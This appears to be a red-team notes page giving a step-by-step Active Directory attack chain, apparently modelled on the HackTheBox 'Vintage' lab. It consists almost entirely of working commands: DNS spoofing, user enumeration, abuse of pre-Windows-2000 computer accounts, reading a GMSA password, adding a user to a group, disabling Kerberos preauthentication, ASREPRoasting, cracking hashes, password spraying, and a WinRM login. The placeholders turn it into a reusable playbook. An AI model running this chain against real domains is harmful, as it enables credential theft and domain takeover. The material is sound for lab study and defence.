#Red-Team #Exploit #Tool #Generation #Payload #Vulnerability 

## What is a .ccache file?

#### A `.ccache` file stores Kerberos authentication tickets for accessing services securely.


## Requirements:

### [[Tools to download!]]

## Exploitation: 


## Step 1:

### Set the Target IP = `export TARGET=10.10.x.x` then use dnspoofing `python3 dnschef.py --fakeip $TARGET --fakedomains DOMAIN`


## Step 2:

### Get the Kerberos ticket for the user:  `getTGT.py vintage.htb/USER:PASSWORD` set the KRBCCNAME with `export KRB5CCNAME=.CCACHE FILE` Get all the users with **ldapdomaindump** or **nxc**: `nxc smb dc01.DOMAIN -d DOMAIN -k --use-kcache --rid-brute 5000 | grep SidTypeUser | cut -d: -f2 | cut -d \\ -f2 | cut -d' ' -f1 > users`


## Step 3:

### **Find computer account with password as hostname and save TGT:** Run the following to find the computer account:

### `pre2k unauth -d DOMAIN -dc-ip $TARGET -save -inputfile users
`
### and rename the `.ccache` file to the computer's hostname:

### `mv FS01\$.ccache FS01.ccache && export KRB5CCNAME=FS01.ccache`


## Step 4:

### **Get GMSA password:** Use `bloodyAD` to get the password for the GMSA:

### `bloodyAD --host dc01.DOMAIN -d "DOMAIN" --dc-ip $TARGET -k get object 'GMSA01$' --attr msDS-ManagedPassword
`
### Then, run `getTGT.py` with the GMSA account to get the TGT:

### `getTGT.py DOMAIN/'GMSA01$' -hashes :HASH && mv GMSA01\$.ccache GMSA01.ccache && export KRB5CCNAME=GMSA01.ccache`


## Step 5:

### **Add user to SERVICEMANAGERS:** Add the user USER, whose you got the password to the `SERVICEMANAGERS` group:

### `bloodyAD --host dc01.DOMAIN -d "DOMAIN" --dc-ip $TARGET -k add groupMember "SERVICEMANAGERS" "USER"

### and, get the TGT for `USER`:

### `getTGT.py vintage.htb/USER:PASSWORD && export KRB5CCNAME=USER.ccache`


## Step 6:

### **Set "Don't require preauth" flag for accounts:** Use `bloodyAD` to set the `DONT_REQ_PREAUTH` flag:

### `bloodyAD --host dc01.DOMAIN -d "DOMAIN" --dc-ip $TARGET -k add uac SVC_ARK -f DONT_REQ_PREAUTH && bloodyAD --host dc01.DOMAIN -d "VINTAGE.HTB" --dc-ip $TARGET -k add uac SVC_SQL -f DONT_REQ_PREAUTH
`
### **Enable the SVC_SQL account:** Use `bloodyAD` to enable the `SVC_SQL` account:

### `bloodyAD --host dc01.DOMAIN -d "DOMAIN" --dc-ip $TARGET -k remove uac SVC_SQL -f ACCOUNTDISABLE
`

## Step 7:

### **ASREPRoast the users:** Use `GetNPUsers.py` to perform ASREPRoasting and dump the hashes:

### `GetNPUsers.py -request -outputfile np.txt -format hashcat -usersfile users vintage.htb/
`
### Then crack it with `john`


## Step 8:

### **Password spray the users:** Use `kerbrute` to perform a password spray attack:

### `kerbrute_linux_amd64 --dc DOMAIN -d vintage.htb -v passwordspray users PASSWORD
`
### Don't forget to configure your `/etc/krb5.conf` file:

````
[libdefaults]
    default_realm = DOMAIN
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    VINTAGE.HTB = {
        kdc = dc01.DOMAIN
        admin_server = dc01.DOMAIN
    }

[domain_realm]
    .DOMAIN = DOMAIN
    DOMAIN = DOMAIN

````

## LAST step:

### **Login to Account:** Finally, use the obtained password to login to the account, whom you password cracked to:

### `getTGT.py vintage.htb/USER:PASSWORD && evil-winrm -i dc01.DOMAIN -r DOMAIN`
